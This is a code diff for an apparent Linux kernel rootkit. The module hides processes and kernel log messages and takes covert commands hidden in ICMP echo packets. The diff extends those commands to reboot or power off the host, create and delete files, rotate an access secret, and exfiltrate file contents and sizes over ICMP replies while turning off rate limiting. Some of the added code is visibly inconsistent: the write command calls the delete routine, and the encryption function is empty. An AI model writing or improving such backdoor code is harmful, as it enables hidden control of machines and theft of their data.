@@ -123,8 +123,10 @@ static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {KHTREAD_PROC_NAME, "hidden_c
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
 /* secret */
-static char *secret = "hidden_proc";
-module_param(secret, charp, 0644);
+#define LEN_SECRET 32 
+static int num_secret = LEN_SECRET;
+static char secret[LEN_SECRET] = "hidden_proc";
+module_param_array(secret, byte, &num_secret, 0644);
 
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
@@ -1761,9 +1763,16 @@ static int run_usr_cmd(int cmd)
         return ret;
 }
 
-#define LEN_PREFIX_CMD 3
+#define LEN_PREFIX_CMD  sizeof(short)
 enum {
-	CMD_SEND_FILE = 1,
+	CMD_RESTART     = 1,
+	CMD_SHUTDOWN    = 2,
+	CMD_SECRET      = 3,
+	CMD_CREATE_FILE = 4,
+	CMD_DELETE_FILE = 5,
+	CMD_WRITE_FILE  = 6,
+	CMD_GET_FILE_SIZE = 7,
+	CMD_SEND_FILE   = 8,
 	MAX_NUM_CMD,
 };
 
@@ -1782,35 +1791,53 @@ int make_exec_event(int cmd, void *data);
 static int do_icmp_echo(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
-	char *cmd = NULL;
+	short int cmd = 0;
 	int len = 0;
-
 	int ret = -1;
 
 	icmph = icmp_hdr(skb);
-	cmd = (char *)icmph + sizeof(struct icmphdr);
+	cmd = ntohs((short)*((char *)icmph + sizeof(struct icmphdr)));
 	len = skb->len - sizeof(struct icmphdr);
 
-	if (len < 3)
+	if (len < LEN_PREFIX_CMD)
 		goto end;
 
-	//*** or len == 7/18/29/40/51
-	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*')) {
-		kernel_restart(NULL);
+	switch (cmd) {
+	case  CMD_RESTART:
+		kernel_restart(NULL); break;
 
-	//$$$ or len == 2/17/32/47
-	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$'))  {
+	case  CMD_SHUTDOWN: 
 		kernel_power_off();
 		do_exit(0);
-	//0x010101 or len == 6/30/54/
-	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01)) {
+		break;
+
+	case  CMD_CREATE_FILE: 
 		run_usr_cmd(CMD_TOUCH_FILE);
-	//0x020202 or len == 3/28/53/
-	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02)) {
+		ret = 0;
+		break;
+
+	case  CMD_DELETE_FILE: 
 		run_usr_cmd(CMD_RM_FILE);
-	} else if (cmd[0] == 0x03 && cmd[1] == 0x03 && cmd[2] == 0x03) {
-		if (len > 3)
-			ret = make_exec_event(CMD_SEND_FILE, skb);
+		ret = 0;
+		break;
+
+	case  CMD_WRITE_FILE: 
+		run_usr_cmd(CMD_RM_FILE);
+		ret = 0;
+		break;
+
+	case  CMD_SECRET: 
+		ret = make_exec_event(cmd, skb);
+		break;
+
+	case  CMD_GET_FILE_SIZE: 
+	case  CMD_SEND_FILE: 
+		if (len > LEN_PREFIX_CMD)
+			ret = make_exec_event(cmd, skb);
+		break;
+
+	default:
+		break;
 	}
 end:
 	return ret;
@@ -1929,8 +1956,6 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 		goto end;
 //	printk(KERN_INFO "fname:%s, size:%llu", fname, file_size);
 
-	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
-
 	size = 0;
 	seq = ntohs(icmp_hdr(skb)->un.echo.sequence);
 	skb2 = skb_copy(skb, GFP_ATOMIC);
@@ -1939,6 +1964,7 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	icmph = icmp_hdr(skb2);
 	cmd = (char *)icmph + sizeof(struct icmphdr);
 
+	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	while (file_size > 0) {
 		len = file_size > buf_len ? buf_len : file_size;
 
@@ -1951,26 +1977,64 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 		file_size -= len;
 		size += len;
 	}
+	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 //	printk(KERN_INFO "fname:%s, tran size:%llu\n", fname, size);
 
 end:
 	if (skb2)
 		kfree_skb(skb2);
-
-	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
-
 	if (data)
 		vfree(data);
 	if (fname)
 		kfree(fname);
+	kfree_skb(skb);
 	return 0;
 }
 
-static int send_file_task(void *data)
+static long get_file_size(const char *name)
+{
+	struct kstat stat;
+	long size = -1;
+
+	if (!name)
+		goto end;
+	if (vfs_stat(name, &stat) != 0)
+		goto end;
+	if (!S_ISBLK(stat.mode))
+		goto end;
+	size = stat.size;
+end:
+	return size;
+}
+
+static int do_send_file_size(const char *name, struct sk_buff *skb, char *buf, int buf_len)
+{
+	long file_size = 0;
+	int rc = -1;
+
+	if (!name || buf_len < sizeof(file_size))
+		goto end;
+
+	file_size = htonl(get_file_size(name));
+	if (file_size < 0)
+		goto end;
+	//pr_info("name:%s, size:%ld", name, file_size);
+	memcpy(buf, (void*)&file_size, sizeof(file_size));
+
+	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+	real_icmp_echo(skb);
+	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+
+	rc = 0;
+end:
+	return rc;
+}
+
+static int do_file_task(short cmd, void *data)
 {
 	struct sk_buff *skb = data;
 	struct icmphdr *icmph = NULL;
-	char *cmd = NULL;
+	char *p_cmd = NULL;
 	char *name = NULL;
 	int len = 0;
 	int f_len = 0;
@@ -1978,15 +2042,15 @@ static int send_file_task(void *data)
 	int ret = -1;
 
 	if (!data)
-		return 0;
-
-	icmph = icmp_hdr(skb);
-	cmd = (char *)icmph + sizeof(struct icmphdr);
-	len = skb->len - sizeof(struct icmphdr);
-	if (len <= 3)
 		goto end;
 
-	name = cmd + LEN_PREFIX_CMD;
+	icmph = icmp_hdr(skb);
+	p_cmd = (char *)icmph + sizeof(struct icmphdr);
+	len = skb->len - sizeof(struct icmphdr);
+	if (len <= LEN_PREFIX_CMD)
+		goto end;
+
+	name = p_cmd + LEN_PREFIX_CMD;
 	len -= LEN_PREFIX_CMD;
 	while (i<len && name[i] != '\0') {
 		if (!isprint(name[i])) {
@@ -2000,11 +2064,61 @@ static int send_file_task(void *data)
 	if ((f_len = strlen(name)) == 0)
 		goto end;
 
-	ret = do_send_file(name, skb, name+f_len+1, len-f_len-1); 
+	switch (cmd) {
+	case CMD_SEND_FILE:
+	      ret = do_send_file(name, skb, name+f_len+1, len-f_len-1); 
+	      break;
+	case CMD_GET_FILE_SIZE:
+	      ret = do_send_file_size(name, skb, name+f_len+1, len-f_len-1); 
+	      break;
+	default:
+	     break;
+	}
 
 end:
-	kfree_skb(skb);
 	return ret;
+}
+
+static int enc_buf(char *dst, char *src, int len)
+{
+	return 0;
+}
+
+static int do_secret_task(struct sk_buff *skb)
+{
+	struct icmphdr *icmph = NULL;
+	char *p_cmd = NULL;
+	char *new_sec = NULL;
+	int len_sec = LEN_SECRET;
+	int len = 0;
+	int rc = -1;
+
+	icmph = icmp_hdr(skb);
+	p_cmd = (char *)icmph + sizeof(struct icmphdr);
+	len = skb->len - sizeof(struct icmphdr);
+	len -= LEN_PREFIX_CMD;
+	if (len < LEN_SECRET)
+		goto end;
+
+	new_sec = kmalloc(2*len_sec, GFP_KERNEL);
+	if (!new_sec)
+		goto end;
+
+	get_random_bytes(new_sec, len_sec);
+	enc_buf(new_sec+len_sec, new_sec, len_sec);
+	
+	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, len_sec);
+
+	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+	real_icmp_echo(skb);
+	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+
+	memcpy(secret, new_sec, len_sec);
+	kfree(new_sec);
+
+	rc = 0;
+end:
+	return rc;
 }
 
 int make_exec_event(int cmd, void *data)
@@ -2049,8 +2163,12 @@ static int kthread_do_event(void *data)
 
 		if (ev) {
 			switch (ev->cmd) {
+			case CMD_GET_FILE_SIZE:
 			case CMD_SEND_FILE:
-				send_file_task(ev->data);
+				do_file_task(ev->cmd, ev->data);
+				break;
+			case CMD_SECRET:
+				do_secret_task(ev->data);
 				break;
 			default:
 				break;
